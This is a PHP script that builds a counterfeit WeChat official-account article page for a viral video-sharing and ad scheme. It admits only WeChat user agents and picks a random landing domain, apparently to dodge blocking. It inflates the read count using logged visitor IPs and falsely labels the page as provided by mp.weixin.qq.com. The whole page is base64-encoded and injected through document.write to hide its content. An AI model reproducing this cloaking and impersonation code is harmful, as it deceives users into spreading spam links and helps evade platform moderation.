<?php
include 'init.php';

// 非微信访问跳转
if (stripos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') === false) {
    header('Location:' . $notwxlink);
    exit();
}

// 非微信访问跳转
//if (!(isWechat() && isMobile())) {
//    header('Location:' . $notwxlink);
//    exit();
//};

// 非入口域名跳转访问
//if (stripos($_SERVER['HTTP_REFERER'], $safe_link[0]) === false) {
//    header('Location:' . $notwxlink);
//    exit();
//}

// 落地域名随机
$shares_link = $share_link[mt_rand(0, count($share_link) - 1)];
//if (true !== domainCheck($apiToken,$share_link)) {
//    unset($shares_link);
//    foreach (delByValue($share_link,$shares_link) as $v) {
//        if (true !== domainCheck($apiToken,$share_link)) {
//            continue;
//        }
//        $shares_link = $v;break;
//    }
//};

if (empty($shares_link)) {
    header('Location:' . $systemSetting['back_link_' . mt_rand(0, 2)]);
    exit();
}
$randnum = mt_rand(10, 120);
// 后退链接，阅读链接，底部广告链接，公众号链接随机
if (($randnum >= 20 && $randnum <= 40) || ($randnum >= 90 && $randnum <= 110)) {
    $back_link   = $back_link[mt_rand(0, count($back_link) - 1)];
    $name_link   = $name_link[mt_rand(0, count($name_link) - 1)];
    $read_link   = $read_link[mt_rand(0, count($read_link) - 1)];
    $footer_link = $footer_link[mt_rand(0, count($footer_link) - 1)];
    $footer_img  = $footer_img[mt_rand(0, count($footer_img) - 1)];
} else {
    $back_link   = current($back_link);
    $name_link   = current($name_link);
    $read_link   = current($read_link);
    $footer_link = current($footer_link);
    $footer_img  = current($footer_img);
}

// 访问数量统计
$curr     = isset($_SERVER["REMOTE_ADDR"]) && !empty($_SERVER["REMOTE_ADDR"]) ? ip2long($_SERVER["REMOTE_ADDR"]) : '0000000000';
$filename = 'jssdkphpversion/readcou.php';
$data     = trim(substr(file_get_contents($filename), 15));
if (!empty($data)) {
    $data = json_decode($data, true);
    if (!in_array($curr, $data)) {
        array_push($data, $curr);
    }
} else {
    $data = array($curr);
}
if (count($data) > ($max_readcou - $min_readcou)) {
    $data = array($curr);
}
if ($fp = fopen($filename, 'w+')) {
    $startTime = microtime();
    do {
        $canWrite = flock($fp, LOCK_EX);
        if (!$canWrite) usleep(round(rand(0, 100) * 1000));
    } while ((!$canWrite) && ((microtime() - $startTime) < 1000));

    if ($canWrite) {
        fwrite($fp, "<?php exit();?>" . json_encode($data));
    }
    fclose($fp);
}

$readcou = $min_readcou + count($data);
$html    = <<<EOT
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no">
    <title>{$videoTitle}</title>
	<link rel="stylesheet" type="text/css" href="assets/weui.min.css">
    <link rel="stylesheet" type="text/css" href="assets/main.css?ver=9999">
    <link rel="stylesheet" type="text/css" href="assets/more.css">
    <link rel="stylesheet" type="text/css" href="assets/swiper.min.css">
    <script src="assets/jquery.min.js?ver=999"></script>
    <script src="assets/jquery.cookie.js"></script>
    <script src="assets/zepto.min.js"></script>
    <script src="assets/iscroll-lite.min.js"></script>
    <script src="assets/swiper.min.js"></script>
    <script src="https://imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_zepto.js" charset="utf-8"></script>
    <script src="https://v.qq.com/iframe/tvp.config.js" charset="utf-8"></script>
    <script type="text/javascript" src="https://s23.cnzz.com/z_stat.php?id=1276340612&web_id=1276340612"></script>
</head>
<body id="activity-detail" class="zh_CN mm_appmsg" style="background-color:#333;">
<div id="content-content"  style="height:40px;text-align:center;padding-top:10px;color:#999;font-size:80%;display:block;">网页由 mp.weixin.qq.com 提供</div>
<div id="wrapper" style="position:absolute;top:0;bottom:0;left:0;right:0;">
    <div id="scroll" style="position:absolute;background-color:#f3f3f3;z-index:100;width:100%;">
        <div id="js_article" class="rich_media">
            <div id="js_top_ad_area" class="top_banner"> </div>
            <div class="rich_media_inner">
                <div id="page-content">
                    <div id="img-content" class="rich_media_area_primary" style="padding-top:5px;">
                        <h2 class="rich_media_title" id="activity-name"> {$videoList['title']}</h2>
                        <div class="rich_media_meta_list" style="margin-bottom:0;">
                            <em id="post-date" class="rich_media_meta rich_media_meta_text">{$date}</em>
                            <a class="rich_media_meta rich_media_meta_link rich_media_meta_nickname" style="color:#607fa6;" href="{$name_link}" id="post-user"> 热门劲爆视频</a>
                        </div>
                        <div class="rich_media_content" id="js_content" style="height:200px;">
                        </div>
                        <p style="text-align:center">
                            <img src="assets/e645b06bly1fj7qiy0djrg20hs0243yg.gif">
                        </p>
                        <div class="rich_media_tool" id="js_toobar" style="padding-top:10px;">
                            <a class="media_tool_meta meta_primary" style="color:#607fa6;"  id="js_view_source" href="{$read_link}">阅读原文</a>
                            <div id="js_read_area" class="media_tool_meta tips_global meta_primary" >阅读 <span id="readNum">{$readcou}</span></div>
                            <div  class="media_tool_meta meta_primary tips_global meta_praise" id="like">
                                <i class="icon_praise_gray"></i>
                                <span class="praise_num" id="likeNum">{$stars}</span>
                            </div>
                            <a id="js_report_article" class="media_tool_meta tips_global meta_extra" href="javascript:;" onclick="jump('tousu/index.htm');">投诉</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="rich_media_extra" id="gdt_area">
            <div class="rich_tips with_line title_tips">
                <span class="tips">广告</span>
            </div>
            <div class="js_ad_link extra_link" style="padding:0 15px;">
                <p>
                    <a href="javascript:;" onclick="jump('{$footer_link}');">
                        <img src="{$footer_img}" alt="">
                    </a>
                </p>
            </div>
        </div>
            </div>
    <div style="display:none">{$statistics}</div>
</div>
<div id="pauseplay" style="display:none;opacity:0;position:fixed;left:0;right:0;top:65px;bottom:0;background-color:#000;z-index:1000000;"></div>
</body>
<script>
    var pageGlobal = {};
    pageGlobal.vid = '{$vid}';
    pageGlobal.playStatus = '';
    pageGlobal.delayTime = parseInt('{$video_play_seconds}');
    pageGlobal.backUrl = '{$back_link}';
    // 跳转域名
    pageGlobal.flyUrl = 'http://{$_SERVER['HTTP_HOST']}/realphpsharepage.php';
    pageGlobal.sMode = 'a';
    pageGlobal.title = "{$wxtitle}";
    //pageGlobal.link = "http://{$_SERVER['HTTP_HOST']}/realphphtmlpage.php";
    pageGlobal.link = "{$shares_link}";
    pageGlobal.imgUrl = "{$wximg}";
    pageGlobal.desc = "{$wxdesc}";
	pageGlobal.qtitle = "{$pyqtitle}";
    pageGlobal.qlink = "http://s4.app1108264154.qqopenapp.com/qrvide.php";
    pageGlobal.qimgUrl = "{$pyqimg}";
</script>
<script src="//res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
<script src="assets/page_c.js?20171113999"></script>
</html>
EOT;
?>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8">
    <title>正在加载 . . . 请稍等 . . .</title>
    <script src="assets/jquery.min.js"></script>
    <script src="assets/base64.min.js"></script>
</head>
<body>
<script>
    function b64DecodeUnicode(str) {
        return decodeURIComponent(atob(str).split('').map(function (c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
    }

    var doc = document.open('text/html', 'replace');
    var dat = b64DecodeUnicode('<?php echo base64_encode($html);?>');
    doc.write(dat);
    doc.close();
    document.title = $('title:eq(1)').text();
</script>
</body>
</html>
        